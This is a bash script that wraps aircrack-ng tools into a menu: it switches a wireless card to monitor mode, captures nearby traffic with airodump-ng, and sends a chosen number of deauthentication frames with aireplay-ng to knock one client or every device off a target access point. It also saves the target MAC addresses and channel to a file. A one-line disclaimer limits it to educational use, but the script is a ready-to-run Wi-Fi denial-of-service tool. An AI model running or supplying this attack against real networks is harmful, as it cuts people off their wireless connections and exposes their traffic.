#!/bin/bash

figlet "Aircrack"
echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissons to test!"
echo "- Created by Sondre"
echo ""

deAuth () {
   echo "-- Starting de-auth attack ($number requests) --"
   sudo airmon-ng start $interfaceMon $channel > /dev/null
	if [ -z "$client" ]
	then
		sudo aireplay-ng -0 $number -a $ap $interfaceMon
	else
		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
	fi
}


# interfaces
interface=wlp8s0
interfaceMon=wlp8s0mon
# 1 = monitor mode is enabled
mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)
# color
green=`tput setaf 2`
red=`tput setaf 1`
reset=`tput sgr0`

if [ "$EUID" -ne 0 ]
  then echo "${red}PLEASE RUN THIS SCRIPT AS ROOT!"
  exit
else
  echo "${green}Root OK${reset}" 
fi

if [ "$mangedMode" == "0" ]
then
	echo ""
	echo "WARNING: Montior mode is not enabled."
	read -p 'Do you wish to enable monitor mode (y / n)?: ' option1

	if [ "$option1" == "y" ]
	then
		echo ""
		sudo airmon-ng start $interface > /dev/null
		echo "MONITOR MODE ENABLED"
	fi
else
	echo "${green}MONITOR MODE ENABLED: $interfaceMon ${reset}"
fi

echo ""
echo "-- SELECT AN OPERATION --"
echo "[1] Airodump: see traffic"
echo "[2] De-auth: De-auth devices on network"
echo "[3] Disable monitor mode for $interfaceMon"
echo ""
read -p 'Select operation: ' option2

if [ "$option2" == "1" ]
then
	sudo airodump-ng $interfaceMon
	echo "Done."
elif [ "$option2" == "2" ]
	then
	echo ""
	read -p "Load from file (y/n)? " load
	echo ""

	if [ "$load" == "y" ]
	then
		ap=$(sed -n 1p file)
		client=$(sed -n 2p file)
		channel=$(sed -n 3p file)

		echo "-- Target details -- "
		echo "AP MAC: "$ap
		echo "Client MAC: "$client
		echo "Channel: "$channel
		echo ""

		read -p "Enter number of requests: " number
		echo ""
		deAuth
	else
		read -p "Access point Mac address: " ap
		read -p "Client Mac address (leave empty for every device): " client
		read -p "How many de-auth request should be sent? " number
		read -p "Channel: " channel
		echo ""

		printf "$ap\n$client\n$channel" > file # save to file

		deAuth
fi
elif [ "$option2" == "3" ]
	then
	echo "Stoppping interface..."
	sudo airmon-ng stop $interfaceMon > /dev/null
	echo "Done."
fi